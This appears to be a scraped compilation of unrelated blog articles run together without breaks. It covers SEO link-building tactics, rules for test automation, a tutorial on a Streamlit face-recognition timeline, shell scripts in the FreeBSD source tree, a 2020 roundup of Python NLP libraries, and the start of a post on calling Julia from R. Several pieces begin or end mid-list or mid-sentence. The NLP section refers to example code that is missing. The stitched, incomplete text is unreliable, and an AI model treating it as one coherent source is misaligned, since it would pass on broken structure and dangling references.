<p><b>Choose a directory relevant to your niche, and the chances of reaching your target audience and boosting your SEO will be much higher.</b></p>
<h3><b>5. </b> <b>Brand mentions</b></h3>
<p><b>Unlinked brand mentions are when people mention your brand online without linking to your website–which means you’re already halfway towards earning a link. </b><span>The blogger already knows of your business; thus, you have the perfect excuse to reach out and ask for a link back to your site.</span></p>
<p><span>What kind of mentions can you link back to? Anything that mentions you or your brand can serve as a backlink, for example, product names, services, slogans, and even your name.</span></p>
<p><span>To start, create a list of any unique products, services, and brand representatives for your business. Then, you can search them on Google or use a tool like </span><a href="https://ahrefs.com/content-explorer"><span>Ahrefs Content Explorer</span></a><span> to find mentions of your brand online. If you are building awareness and already started doing some traditional marketing, such as press releases, you’ll likely find articles where you or your brand is mentioned online.&nbsp;</span></p>
<p><span>A few rules before asking for a link: first, don’t be pushy. Ask yourself if adding a link makes sense within the context of the article. Secondly, don’t request links if they don’t add value. If the article expresses an unfavorable or critical opinion of your brand, you probably shouldn’t ask for a link. Last, always offer value. If something could be expanded on or improved in the article, don’t be afraid to mention it in your email outreach. Using these three rules, you’re more likely to get a favorable response when you ask for a link to your website.&nbsp;</span></p>
<h3><b>6. </b> <b>Sponsorships</b></h3>
<p><span>If you want, you can secure backlinks from local projects or causes you already support. </span><b>Many cause-based sites have pages dedicated to donors where they show their sponsors’ logos and link to their websites.</b></p>
<p><i><span>Different sponsorship opportunities</span></i></p>
<ul>
<li><b>Sponsoring an event</b><span> to get publicity and brand visibility.&nbsp;</span></li>
<li><b>Consider sponsoring a podcast</b><span> or a webinar. You may get a backlink from it.</span></li>
<li><b>Conference sponsorships</b><span> get your name in front of a niche audience.&nbsp;</span></li>
<li><b>Non-profit sponsorships</b><span> stand for a great cause while also helping you achieve an authoritative link.&nbsp;</span></li>

<h3><b>7. </b> <b>Link building tools</b></h3>
<p><b>Link building tools can help you to find backlink opportunities.</b><span> If you have some money to spend on tools, we have some useful options:</span></p>
<ul>
<li><a href="https://www.buzzstream.com/"><b>BuzzStream</b></a><span> is a perfect tool to create a list of prospects and do outreach for them.</span></li>
<li><a href="https://ahrefs.com/"><b>Ahrefs</b></a><span> is a tool you can use to analyze backlinks from any site and look for relevant content and keywords.&nbsp;</span></li>
<li><a href="https://moz.com/moz-pro-free-trial"><b>Moz</b></a><span> is great for prospecting for expert roundups or even want to add external links to your articles. You can use </span><a href="https://moz.com/products/pro/seo-toolbar"><span>MozBar</span></a><span> to know the domain authority of each one directly from the Google results page.</span></li>
</ul>
<h3><b>8. </b> <b>Guest blogging</b></h3>
<p><b>Guest posts are probably the number one way companies look for backlinks</b><span>. But is the </span><a href="https://moz.com/learn/seo/what-is-link-equity"><span>link equity</span></a><span>&nbsp;being passed to your site? Unlikely — but maybe.&nbsp;</span></p>
<p><span>John Mueller, a Google senior webmaster trends analyst, recently said on </span><a href="https://twitter.com/JohnMu/status/1271697162762686464"><span>Twitter</span></a><span> that links within guest blog posts or contributed content should be </span><a href="https://backlinko.com/nofollow-link"><span>nofollowed</span></a><span>.</span></p>
<blockquote>
<p dir="ltr" lang="en">Essentially if the link is within the guest post, it should be nofollow, even if it’s a “natural” link you’re adding there.</p>
<p>FWIW none of this is new, and I’m not aware of any plans to ramp up manual reviews of this. We catch most of these algorithmically anyway.</p>
<p>— 🍌 John 🍌 (@JohnMu) <a href="https://twitter.com/JohnMu/status/1271697162762686464?ref_src=twsrc%5Etfw">June 13, 2020</a></p></blockquote>

<p><span>Still, many SEOs still believe in the power of guest posting. Google somehow still counts those links, and there’s no question may marketers have seen benefits from these opportunities. Whether it be SERP improvements, increased traffic — or most importantly, more leads.</span></p>
<p><span>A </span><a href="https://twitter.com/dejanseo/status/1271602260120760320"><span>poll</span></a><span> by SEO marketer, Dan Petrovic, showed that many SEO experts use guest blogging to build links. </span></p>

<p><span>When you write a guest post for another site, you’re proving you’re an expert. You’re also offering quality content to a similar audience in another site (meaning probably they’re going to visit your website). Just because Google’s algorithms may ignore the link doesn’t mean you shouldn’t do it. Guest blogging could be very valuable for your company.&nbsp; There are many ways you can find </span><a href="https://loganix.com/guest-blogging-opportunities/"><span>guest blogging opportunities</span></a><span>. Adam Steele of Loganix gives these guest blog tips:</span></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <p><img width="1080" height="634" src="https://3laqvw22wekb3ykm8z4dbnq8-wpengine.netdna-ssl.com/wp-content/uploads/2020/08/ft-testing-automation.jpg" alt="5 rules for successful test automation" srcset="https://www.functionize.com/wp-content/uploads/2020/08/ft-testing-automation.jpg 1080w, https://www.functionize.com/wp-content/uploads/2020/08/ft-testing-automation-300x176.jpg 300w, https://www.functionize.com/wp-content/uploads/2020/08/ft-testing-automation-1024x601.jpg 1024w, https://www.functionize.com/wp-content/uploads/2020/08/ft-testing-automation-768x451.jpg 768w" sizes="(max-width: 1080px) 100vw, 1080px">      </p>	  
    
        <blockquote><p>The key to successful use of test-automation tools is to correctly calibrate expectations: Recognize what the software can do and be equally aware of what it cannot do. That helps you make useful decisions in the most important areas: what can and should be automated, how it should be done, and who should do it.</p></blockquote>
<p>The purpose of automated testing is to help people work smarter. Use test automation to take the development effort where humans can’t go, and amplify the testing of good testers.</p>
<p>Despite the field’s established history, some CIOs and managers expect test automation to fully automate all product testing, magically create 100% code coverage, and catch all bugs. Not to mention a secret belief that they can fire all the talented people and hire a chimp.</p>
<h3>1. Automation reflects a process; it doesn’t replace it</h3>
<p>Don’t confuse <a href="https://www.functionize.com/blog/automated-functional-testing-101/">test automation</a> with vendor tools. However good they are – and we do like to think that Functionize exemplifies the best possible options! – any tool can only help you improve a process. Think of a kitchen blender, which is a more efficient way to combine ingredients than is a mortar and pestle. Or consider carpentry: Power tools help a carpenter build a house faster than with hand tools, but she doesn’t just sit back and watch the tools build the house by themselves.</p>
<p>Rather, approach test automation as a way to test applications for conformance to the QA criteria by which you judge software as ready to release. The tools allow you to submit input, capture output, and compare it against a baseline. In other words, test automation tools merely automate a process you already (we hope) have in place.</p>
<p>That’s the danger and the opportunity. Automating a good process shows how good that process is. Automating a bad process amplifies its weaknesses.</p>
<h3>2. It’s another development project</h3>
<p>Treat the test-automation project like any other development project. That means putting together specifications on what it will and will not do, how the code/modules are designed, and so on.</p>
<p>The automation needs to be planned, managed, monitored and supported just like a real application development project. It’s just another kind of product development, and thus beholden to the same rules and processes as any other type of software development project.</p>
<h3>3. Automate the right things</h3>
<p>Test automation is an ideal solution in several situations, but don’t force these tools into the wrong role. Among the positive points: It is a good way to get repeatable tests, to expand application coverage, to speed up tests on subsequent versions of the application, and to do <a href="https://www.functionize.com/blog/regression-testing-what-you-need-to-know/">regression testing</a>.</p>
<p>But it is automation, not automagic. Don’t expect to automate everything. Some tasks inherently require manual testing.</p>
<p>The testing part still belongs to the testers. Those professionals are responsible for coming up with appropriate input to exercise the application, working out whether the output is both correct and according to spec, and looking for bugs.</p>
<h3>4. Get the right people</h3>
<p>Apparently, many managers assume that because the automation tools do all the work, an intern can run the software. This attitude gets professional testers’ shorts tied in a knot.</p>
<p>“Get the right staff,” one tester insisted. “This type of work requires the right type of skills and knowledge. Testers need to know how to write code, how the application under test is built, and how to do testing.”</p>
<p>For any nontrivial test-automation project, <a href="https://www.functionize.com/blog/5-reasons-why-qa-needs-humans/">you need dedicated personnel</a>. As long as the developers have to split their time between automated and manual testing responsibilities, the test-automation effort never really gets up and going in a truly successful manner.</p>
<h3>5. Design applications to be tested</h3>
<p>Automated or no, QA tests don’t come out of nowhere. Programmers should create their applications with testability in mind, or at least with clear communication among the business subject-matter experts, the development staff, and the QA team.</p>
<p>One example of the design-for-test approach is for QA staff to set conventions that developers follow. For example, get developers to always guarantee a unique way of identifying an object. It can be its associated text, a title, a unique ID, etc. Once you have this standard set, see if the test tool has options for setting the order in which it picks an identifiers.</p>
<p>Otherwise, you can slow down the testing process. “The main difficulty I faced was the inconsistency of the different warning or error messages the product was returning to the user,” a tester told me. “The same message window was used either for a warning or a error, but from the automation point of view it was really hard to figure out if you should list the run as successful or as a failure,” she added.</p>
<blockquote><p>The promise of continuous testing is faster delivery of higher quality software. Our white paper explains <a href="https://www.functionize.com/project/continuous-testing-the-good-the-bad-and-the-ugly/">how it works</a>.</p></blockquote>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><main><article><main><a href="https://pento.ai/blog/terran-meets-streamlit-components"><p>Terran's face recognition meets Streamlit Components</p></a></main><p>We can’t believe Streamlit is barely one year old now. Today, we can’t think of any better tool for creating a fast and interactive dashboard, demos, and visualizations. On top of that, they recently launched a new awesome feature called <a href="https://www.streamlit.io/components">Streamlit Components</a>. This new feature enables developers to create custom visualizations using your favorite front-end framework, namely React, Vue, or just plain HTML.</p><p>Especially, Streamlit is really convenient when starting new machine learning projects, making it super easy and fast to go from nothing to a proof of concept of a ML solution. Because of this, we use Streamlit pretty frequently: for project prototyping, dynamic reports, and for building cool demos 💅</p><p>Particularly, our open-source project Terran was not an exception to this. We've built a face-recognition timeline demo to demonstrate how easy it is to use Terran on YouTube videos, and additionally, how straightforward it is to create amazing visualizations using the new Streamlit Components! 🚀</p><p>In this blog post, we'll share how the process of building this component was, and hopefully, inspire you to build your own component or demo using Terran!</p><p>Our demo consists of the following:</p><ol><li>You take any video from YouTube that has people in it, for example, <a href="https://youtu.be/mbdOqxdiSZc" target="blank" rel="noopener">this Big Bang Theory video</a>.</li><li>Then, we use Terran to detect all the faces that appear in the video, and when they actually appear on the screen.</li><li>Finally, we create a timeline visualization that shows in green when someone is present in the video.</li><li>Optionally, we can make it dynamic so that when the user clicks on a specific time of the timeline, a video player is rendered and it'll begin playing starting from the second the user clicked.</li></ol><p>The final result looks like this</p><a id="what_is_terran" href="#what_is_terran"></a><p><img src="https://pento.ai/images/blog/terran-square.svg" alt="Terran face-recognition timeline"></p><p>Terran is our open-source human perception library. We focus on providing open, auditable, and performant alternatives to closed approaches. Solutions that can run on your computer or device and that will adapt to the environment that it's in. But most importantly, code that you can test (without piling-up costs), understand and modify to your needs.</p><p>You can check out the <a href="https://pento.ai/blog/introducing-terran">Terran's introduction blog post</a> to know more about this project! Also, you can support our project and give it a try and why not a star in Github 💫</p><a id="using_terran's_face-recognition_modules" href="#using_terran's_face-recognition_modules"></a><p>The demo consists of automatically detecting and tracking faces on YouTube videos. With this information, we can generate timeline charts showing specifically when each person appears on the screen or not. The idea then is to use Terran's face-recognition library to generate all the data needed to create a timeline visualization, and then we can create a new Streamlit Component to create a fancy and interactive timeline chart!</p><p>We can split the processes into the following steps:</p><ol><li>Generate the timeline data from a YouTube video using Terran</li><li>Bootstrapping your Streamlit Component and declare the input/output data bindings</li><li>And creating a custom and interactive visualization tool using React and D3</li></ol><p>Let's dive in!</p><a id="generate_the_timeline_data_from_a_youtube_video_using_terran" href="#generate_the_timeline_data_from_a_youtube_video_using_terran"><h2>Generate the timeline data from a YouTube video using Terran</h2></a><p>This is pretty simple. Using Terran's <code>open_video</code> we will iterate through the video's frames, and using the functions <code>face_detection</code> and <code>extract_features</code> we'll detect for each frame where the faces are and a vector representation -features- of each face.</p><p><img src="https://pento.ai/images/blog/terran-streamlit-diagram.jpg" alt="Terran Streamlit timeline generator diagram"></p><p>Then, we can start comparing the extracted features to know if we're talking about the same person or not, we can do a simple <code>cosine_distance</code> threshold to know if that's the case.</p><p>Finally, we create a data structure that stores for each detected person all the frame indexes in which they appear, and that's it!</p><p><img src="https://pento.ai/images/blog/terran-streamlit-structure.jpg" alt="Terran Streamlit timeline generator data structure"></p><p>We created a function <code>generate_timeline</code> that does this exact same logic, plus some other minor features. When being used, it looks as simple as this:</p><pre><pre><code>from streamlit_terran_timeline import generate_timeline

timeline = generate_timeline("https://youtu.be/mbdOqxdiSZc")
</code></pre></pre><a id="bootstrap_your_streamlit_component_and_declare_the_input/output_data_bindings" href="#bootstrap_your_streamlit_component_and_declare_the_input/output_data_bindings"><h2>Bootstrap your Streamlit Component and declare the input/output data bindings</h2></a><p>This step might work differently for you depending on your frontend skills. In particular, we're more into working with React, so this <a href="https://github.com/streamlit/component-template/tree/master/template">Streamlit Component template</a> was great for setting up the demo.</p><p>We think the way of integrating new components to Streamlit is very smart: just assume that you can send all the data you need to build the component as long as this data can be JSON serialized. Additionally, our template will declare our component in a developing stage, so that it is easier for us to adjust our frontend with hot reloading as we make changes. You can go to the <a href="https://docs.streamlit.io/en/stable/streamlit_components.html">official Streamlit documentation</a> for more details.</p><p>To declare the bidings of our component, we create our component function called <code>terran_timeline</code> like this:</p><pre><pre><code>def terran_timeline(timeline, key=None):
    component_value = _component_func(timeline=timeline, key=key, default=0)

    return component_value
</code></pre></pre><p>...where the <code>_component_func</code> is the one that declares our Streamlit Component and we are saying that we want to send a data structured by the name of <code>timeline</code> to this component. The additional <code>key</code> argument makes it possible to have multiple components of the same kind by specifying different keys, and the <code>default</code> argument stands for the default return value of the component, which in this case means starting second value for the video.</p><a id="create_a_custom_and_interactive_visualization_tool_using_react_and_d3" href="#create_a_custom_and_interactive_visualization_tool_using_react_and_d3"><h2>Create a custom and interactive visualization tool using React and D3</h2></a><p>Then we have to move into the React world and start building our component. The good news is that we can retrieve the <code>timeline</code> object inside our component super easily!</p><pre><pre><code>public render = (): ReactNode =&gt; {
    const timeline = this.props.args["timeline"]
    ...
}
</code></pre></pre><p>Also, we can make our component "return" a value using the <code>Streamlit.setComponentValue</code> function they provide in the template, for example, making that when the user clicks on the timeline widget</p><pre><pre><code>//
// If the user clicks on the timeline, we set the component value to the
// time in seconds where the user clicked
//
Streamlit.setComponentValue(seekTimeSecond);
</code></pre></pre><p>The rest is mostly plain React and D3 stuff we think it's not worth focusing on this blog, but if you are interested you can check how it was implemented in our <a href="https://github.com/pento-group/streamlit-terran-timeline">streamlit-terran-timeline repo</a>.</p><p>Here's an example of what it looks like to use this new Streamlit Component:</p><pre><pre><code>import streamlit as st
from streamlit_terran_timeline import generate_timeline, terran_timeline

# Generate the timeline information
video_url = "https://youtu.be/mbdOqxdiSZc"
timeline = generate_timeline(video_url)

#
# Display the timeline. If the users click, you'll get the exact second of
# the part of the timeline video. By default, it returns 0.
#
start_time = terran_timeline(timeline)

#
# Display the video. Optionally, the user might click the timeline and start the video
# from a different time
#
st.video(video_url, start_time=start_time)
</code></pre></pre><p>In summary, the Streamlit Components feature is a game-changer. It was never more straightforward for us to create dynamic, reliable, and nice-looking pilot projects or demos from scratch. It's also really amazing that the Streamlit community is building new components and we're really thrilled to contribute with ours! If you are interested, you can see a full list of published and upcoming components <a href="https://discuss.streamlit.io/t/streamlit-components-community-tracker/4634">in this community post</a> .</p><p>This is the first of many upcoming Terran demos, so stay in touch to know what other cool stuff we're building!

August 27, 2020 | https://www.spinellis.gr/blog/20200827/ | <a href="https://web.archive.org/web/*/https://www.spinellis.gr/blog/20200827/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> <!-- Left content -->
  <p>In an open online <a href="https://www.spinellis.gr/unix?source=bl20200827">edX course on Unix tools</a> I was running over the spring with more than a thousand registered learners, I got <a href="https://courses.edx.org/courses/course-v1:DelftX+UnixTx+1T2020/discussion/forum/93544458673f7c2519a5746c18f1dcc1c3cd4d49/threads/5e77554aeac4b40832a040e4">asked for ideas on how shell scripts can be useful</a>. This is an intriguing question, because the course focuses mainly on performing one-off tasks in the areas of software development, data engineering, and system administration, rather than automation through shell scripts. In response, I posted <a href="https://www.spinellis.gr/blog/20200323">how shell scripting improves my personal productivity</a>. Here's my take on how shell scripts are employed in diverse software development tasks. I plan to post further installments on system administration and data analytics.</p>
<p>To produce the examples listed here, I searched the entire <a href="https://www.freebsd.org/">FreeBSD</a> source code tree for files with a <code>.sh</code> (shell script) suffix. In total I found 1305 scripts (by running the Unix <code>find /usr/src/ -name \*.sh | wc -l</code> pipeline). In summary, I found that shell scripts are used for testing, as program wrappers and adaptors, for stand-alone program implementations, as code generators, for build orchestration and automation, for release management, and for crafting development tools. My experience is that other large software systems use shell scripts in similar ways.</p>
<h3 id="testing">Testing</h3>
<p>Shell scripts are used to automate integration testing, by running the program under specific configurations and scenarios and verifying that the program has the expected behavior. They are also be used for regression testing, by running a program and comparing its output against results of previous runs. The FreeBSD <a href="https://github.com/freebsd/freebsd/blob/release/12.1.0/tests">/tests</a> suite contains 261 tests of both kinds. Many other programs have test scripts bundled with their source code; see for example the <em>pkill</em> command <a href="https://github.com/freebsd/freebsd/blob/release/12.1.0/bin/pkill/tests">tests directory</a>. As an example of regression testing consider the <a href="https://github.com/freebsd/freebsd/blob/release/12.1.0/crypto/openssh/regress">OpenSSH regression tests</a>. In total, another 355 test shell scripts reside in individual programs' <code>tests</code> directories and 227 come bundled with the separate <a href="https://github.com/freebsd/freebsd/blob/release/12.1.0/contrib/netbsd-tests">NetBSD test suite</a>.</p>
<h3 id="program-wrappers-and-adaptors">Program wrappers and adaptors</h3>
<p>In some cases, either by design or through evolution, a program can be easily written by having a shell script call another one. Consider the following examples.</p>
<ul>
<li>The program <em>ranlib</em>, which adds a symbol table to an archive (library) file, used to be <a href="https://github.com/dspinellis/unix-history-repo/blob/BSD-4_3/usr/src/usr.bin/ranlib.c">a stand-alone program</a>. It is now implemented as a <a href="https://github.com/freebsd/freebsd/blob/release/12.1.0/contrib/binutils/binutils/ranlib.sh">one-line shell script</a>, which calls the <em>ar</em> program to do the actual work.</li>
<li>The <em>lp</em> POSIX 1003.2-compliant print spooler interface is implemented as a <a href="https://github.com/freebsd/freebsd/blob/release/12.1.0/usr.sbin/lpr/lp/lp.sh">wrapper</a> around the traditional BSD <em>lpr</em> command.</li>
</ul>
<h3 id="program-implementations">Program implementations</h3>
<p>Some programs are easy to construct by gluing together other existing Unix commands in a shell script. Here are some examples.</p>
<ul>
<li>The <a href="https://github.com/freebsd/freebsd/blob/release/12.1.0/usr.sbin/adduser/adduser.sh">adduser</a> and <a href="https://github.com/freebsd/freebsd/blob/release/12.1.0/usr.sbin/adduser/rmuser.sh">rmuser</a> user management commands.</li>
<li>The <a href="https://github.com/freebsd/freebsd/blob/release/12.1.0/usr.sbin/manctl/manctl.sh">manctl</a> program, which compresses or decompresses the system's manual pages.</li>
<li>The <a href="https://github.com/freebsd/freebsd/blob/release/12.1.0/usr.sbin/service/service.sh">service</a> system service management command (the equivalent of the <em>systemd</em> <em>systemctl</em> command).</li>
<li>The <a href="https://github.com/freebsd/freebsd/blob/release/12.1.0/usr.sbin/ypserv/ypinit.sh">ypinit</a> command, which builds and installs network information service (NIS or yellow pages) databases.</li>
<li>The <a href="https://github.com/freebsd/freebsd/blob/release/12.1.0/usr.sbin/freebsd-update/freebsd-update.sh">freebsd-update</a>, which fetches and installs the system's binary updates.</li>
</ul>
<h3 id="code-generation">Code generation</h3>
<p>Many scripts are used for creating code from higher level descriptions. Consider the following cases.</p>
<ul>
<li>Trivially, the <em>flex</em> <a href="https://github.com/freebsd/freebsd/blob/release/12.1.0/contrib/flex/mkskel.sh">mkskel</a> script, reads a text file containing the boilerplate of the generated lexical analyzer, and converts it into a C array that can be compiled into the lexical analyzer generator executable program.</li>
<li>The <em>curses</em> library <a href="https://github.com/freebsd/freebsd/blob/release/12.1.0/contrib/ncurses/include/MKparametrized.sh">MKparametrized</a> script generates C source for an array specifying whether terminal capability (<em>termcap</em>) strings should undergo parameter and padding translation.</li>
<li>As a more sophisticated case, the kernel's <a href="https://github.com/freebsd/freebsd/blob/release/12.1.0//sys/kern/makesyscalls.sh">makesyscalls</a> shell script, reads <a href="https://github.com/freebsd/freebsd/blob/release/12.1.0/sys/kern/syscalls.master">a declarative specification of the supported system calls</a>, and generates the C code that implements the interface to call the lower-level implementation routines.</li>
</ul>
<h3 id="build-orchestration-and-automation">Build orchestration and automation</h3>
<p>Although shell commands can be readily specified in most build systems, such as <em>make</em>, complex build actions are better documented and tested by putting them in a separate shell script file. For example, <em>yacc</em> uses such a script to <a href="https://github.com/freebsd/freebsd/blob/release/12.1.0/contrib/byacc/test/run_make.sh">orchestrate the build process</a>, while <em>libsodium</em> <a href="https://github.com/freebsd/freebsd/blob/release/12.1.0/sys/contrib/libsodium/dist-build/">uses separate shell scripts</a> to initiate the <em>make</em>-based build process on different systems, ranging from iOS to Android. More widely, the <a href="https://github.com/freebsd/freebsd/blob/release/12.1.0/share/mk/meta2deps.sh">meta2deps</a> shell script looks for "meta" files and extracts information needed to deduce build and src dependencies, <a href="https://github.com/freebsd/freebsd/blob/release/12.1.0/tools/build/depend-cleanup.sh">depend-cleanup</a> cleans dependencies after some difficult-to-track source code changes, and <a href="https://github.com/freebsd/freebsd/blob/release/12.1.0/tools/tinder.sh">tinder</a> builds parts of the source code tree on all supported architectures.</p>
<h3 id="release-management">Release management</h3>
<p><a href="https://github.com/freebsd/freebsd/blob/release/12.1.0/release/scripts">Several scripts</a> are used for putting together the system's release, including the distribution packages, the release notes, the distributed file manifest, and the architecture-specific ISO images.</p>
<h3 id="development-tools">Development tools</h3>
<p>Shell scripts are also used for constructing <em>ad hoc</em> tools for bespoke development tasks. For instance, the <a href="https://github.com/freebsd/freebsd/blob/release/12.1.0/tools/tools/kernxref/kernxref.sh">kernxref</a> tool creates a cross reference of a kernel's symbols, while the <a href="https://github.com/freebsd/freebsd/blob/release/12.1.0/tools/tools/kernelcruft/kernelcruft.sh">kerncruft</a> tool finds unused kernel source code files.</p>

    <p><img src="https://kleiber.me/img/python-nlp-2020.png" alt="Top 10 Python Libraries for Natural Language Processing (NLP) in 2020"></p>

<p>In February 2018, I wrote an <a href="https://kleiber.me/blog/2018/02/25/top-10-python-nlp-libraries-2018/">article</a> about ten interesting Python libraries for Natural Language Processing (NLP).</p>

<p>Compared to 2018, the NLP landscape has widened further, and the field has gained even more traction. While not a perfect measurement, the large number of available libraries and packages is a good indicator of how much (openly accessible) material is out there. At the time of writing, looking for “NLP” on <a href="https://pypi.org/search/?q=NLP">PyPI</a> leads to more than 1,560 results. Similarly, <a href="https://libraries.io/search?languages=Python&amp;q=NLP">Libraries.io</a> lists 450 Python packages/libraries for the NLP keyword. Therefore, I thought it is time to have a look at some interesting NLP libraries again. Please note, however, that this is not meant as a replacement for the 2018 article but rather as an update and addition. Therefore, if you have not done so yet, please also look at the original list as I made some more general comments about NLP and NLP libraries.</p>

<p>Since I wrote that first article, fortunately, a lot has changed in the field of NLP, and we have seen a lot of interesting progress. Things are moving fast! The biggest change, at least from my perspective, is the much more widespread adoption of neural networks, deep learning, and particularly Transformer-based models (see, for example, <a href="https://arxiv.org/abs/1810.04805">BERT (late 2018)</a>, <a href="https://d4mucfpksywv.cloudfront.net/better-language-models/language_models_are_unsupervised_multitask_learners.pdf">GPT-2 (2019)</a>, and most recently <a href="https://arxiv.org/abs/2005.14165">GPT-3 (2020)</a>. While ‘traditional’ approaches to NLP and computational linguistics are still going strong, and rightfully so, these new models and methods are moving the field forward and allow us to do new and exciting things. Hence, I tried to reflect this change in the list of Python libraries as well.</p>

<h2 id="top-10-python-libraries">Top 10 Python Libraries</h2>

<blockquote>
  <p><em>Disclaimer</em>: In the following I’m going to use the terms ‘library’, ‘module’, and ‘package’ rather loosely. Please don’t give me a hard time about it. For the sake of this article, a library will be defined as a (collection of) (third party) extension(s) that you can use in your own code that provides some additional functionality.</p>
</blockquote>

<p>As I said before, there is a myriad of tools and libraries to choose from. Hence it is extremely hard to come up with a reasonable “Top 10 List”. The list I am presenting here has been compiled following a few, rather loose, criteria: I wanted to showcase actively developed, widely used, and multipurpose libraries that are useful to as many developers and researchers as possible. I also took the number of GitHub stars (as a proxy for spread and popularity) as well as the date of the last commit into account. Ultimately, however, the list is also influenced by my experience and my view of what is useful. I am certain that there will be readers who would have liked to see a very different set of libraries - that’s perfectly fine and reasonable!</p>

<p>Where it makes sense, I have provided short examples for the libraries. These examples, by no means, demonstrate the full capabilities of these tools. They are merely there for you to get a feeling for how the APIs look and feel like 😊.</p>

<p><em>The Top 10 Python NLP Libraries. The ‘+ X since 2018’ notes refer to the number of stars reported in the <a href="https://kleiber.me/blog/2018/02/25/top-10-python-nlp-libraries-2018">2018 article</a>. “GitHub Stars” and “Last Commit” as of 2020-08-26.</em></p>

<p>As you might have noticed, my 2020 list differs significantly from the 2018 one. Compared to the old list, the following libraries have been removed or replaced: <a href="https://www.uantwerpen.be/en/research-groups/clips/">Pattern</a>, <a href="http://polyglot.readthedocs.io/en/latest/">Polyglot</a>, <a href="https://github.com/tasdikrahman/vocabulary">Vocabulary</a>, <a href="https://pypi.python.org/pypi/PyNLPl">PyNLPl</a>, <a href="https://github.com/stanfordnlp/python-stanford-corenlp">Stanford CoreNLP Python</a>, and <a href="http://alumni.media.mit.edu/~hugo/montylingua/">MontyLingua</a>. These libraries have either been replaced by a newly developed one (e.g., <em>Stanza</em> replacing <em>Stanford CoreNLP Python</em>) or are not actively developed or maintained anymore. The exclusion of these libraries does not mean that they are bad or unusable in any way. However, I simply wanted to highlight actively developed projects as well as libraries that represent current developments in the field.</p>

<p>As you can see, the libraries that stayed on the list, measured in the number of GitHub stars, have all gained in popularity. Especially <em>spaCy</em> (first released in 2015), an absolutely fantastic all-purpose library, has gained a lot of traction. Also, again looking at the stars, we can see the huge interest in Transformers (🤗 Transformers having 32.9k stars).</p>

<p>An important side note: Many of these libraries and associated pre-trained models, despite often being multilingual or even language-agnostic, still have a strong focus on (standard) English. Similarly, a large amount of linguistic and NLP research focuses on English and other “major” languages. It is very important for me to point out that “language” should <em>not</em> be equated with (standard) English (or Spanish, or German, or French, …) and that the marginalization of other languages and varieties is a severe problem. Therefore, I want to point out that there are various research projects (see, for example, <a href="https://www.masakhane.io/">Masakhane</a> for African languages) devoted to other languages that deserve both attention and support.</p>

<h2 id="libraries-in-detail">Libraries in Detail</h2>

<p>This article will only focus on those libraries that I have newly added to the list. For details and examples regarding the other libraries, please just have a look at the <a href="https://kleiber.me/blog/2020/08/26/top-10-python-nlp-libraries-2020/(https://kleiber.me/blog/2018/02/25/top-10-python-nlp-libraries-2018)">previous article</a>.</p>

<h3 id="-transformers">🤗 Transformers</h3>

<p><a href="https://huggingface.co/">Hugging Face</a>, hence the 🤗, has released a number of highly interesting NLP libraries, utilities, and datasets/models. The most widely known one being 🤗 <em>Transformers</em>, providing easy access to many pre-trained models as well as great interfaces to <em>PyTorch</em> and <em>TensorFlow</em>. Contrary to many of the other libraries, 🤗 <em>Transformers</em> is not a “toolkit,” but a very useful and powerful way of working with various language models and embeddings that is particularly optimized for NLU and NLG tasks.</p>

<p>For this brief example, we will be using the <code>pipeline()</code> function to run pre-trained models for various common tasks. Essentially <code>pipeline()</code> automatically retrieves (downloads) the desired model and also handles the preprocessing (especially tokenization) for us. If you are interested in what happens under the hood, definitely look at the <a href="https://huggingface.co/transformers/quicktour.html#under-the-hood-pretrained-models">documentation</a> that nicely outlines all of the steps taken.</p>

<p>In the above example, the <a href="https://huggingface.co/nlptown/bert-base-multilingual-uncased-sentiment">bert-base-multilingual-uncased-sentiment</a> model is used to predict the sentiment of three statements (reviews). This particular model has been finetuned for sentiment analysis on product reviews and returns a score of stars between one and five. As we can see, for the three simple examples, it performed really well and produced the desired results.</p>

<p>While this example demonstrated how easy it is to get started with 🤗 <em>Transformers</em>, the library’s true value lies in its capabilities when it comes to (re)training/finetuning and customizing models for specific use-cases using either <em>PyTorch</em> or <em>TensorFlow</em>. Also, definitely have a look at the large <a href="https://huggingface.co/models">set of available models for various languages and tasks</a> provided by Hugging Face.</p>

<p><a href="https://github.com/flairNLP/flair"><em>flair</em></a>, developed at the Humbold University of Berlin in collaboration with Zalando Research, provides very easy access to powerful state-of-the-art NLP embeddings and models. While <em>flair</em> is built specifically with the powerful “Flair embeddings” (see “<a href="https://www.aclweb.org/anthology/C18-1139">Contextual String Embeddings for Sequence Labeling</a> for more details) in mind, the library also supports embeddings such as BERT, ELMo, and GloVe.</p>

<p>It comes with a number of embeddings and pre-trained models for various languages and tasks including, for example, Named Entity Recognition, Part-of-Speech Tagging, and Semantic Frame Detection. For each tagging task, <em>flair</em> can use a different model, allowing you to customize your pipeline very well. As we will see below, the library also supports stacking embeddings, which is an exciting …</p></div></div>

    <div>
                <p><a href="https://www.r-project.org/">R</a> is a widely used language for data science, but due to performance most of its underlying library are written in C, C++, or Fortran. <a href="https://julialang.org/">Julia</a> is a relative newcomer to the field which has busted out since its 1.0 to become <a href="https://spectrum.ieee.org/static/interactive-the-top-programming-languages-2020">one of the top 20 most used languages</a> due to its high performance libraries for scientific computing and machine learning. Julia's value proposition has been its high performance in high level language, known as solving the two language problem, which has allowed allowed the language to build <a href="https://juliahub.com/ui/Home">a robust, mature, and expansive package ecosystem</a>. While this has been a major strength for package developers, the fact remains that there are still large and robust communities in other high level languages like R and Python. Instead of spawning distracting language wars, we should ask the question: can Julia become a language of libraries to accelerate these other languages as well?</p>
<p>This is definitely not the first time this question was asked. The statistics libraries in Julia were developed by individuals like <a href="http://128.105.7.173/~bates/">Douglas Bates who built some of R's most widely used packages like lme4 and Matrix</a>. Doug had <a href="https://rpubs.com/dmbates/377897">written a blog post in 2018 showing how to get top notch performance in linear mixed effects model fitting via JuliaCall</a>. In 2018 the JuliaDiffEq organization had <a href="https://sciml.ai/news/2018/04/30/Jupyter/"> written a blog post demonstrating the use of DifferentialEquations.jl in R and Python (the Jupyter of Diffrential Equations)</a>. Now rebranded as <a href="https://sciml.ai/">SciML</a> for <a href="https://sciml.ai/roadmap/">Scientific Machine Learning</a>, we looked to expand our mission and bring <a href="https://arxiv.org/abs/2001.04385">automated model discovery and acceleration</a> include other languages like R and Python with Julia as the base.</p>
<p>With the release of <a href="https://cran.r-project.org/web/packages/diffeqr/index.html">diffeqr</a> v1.0, we can now demonstrate many advances in R through the connection to Julia. Specifically, I would like to use this blog post to showcase:</p>
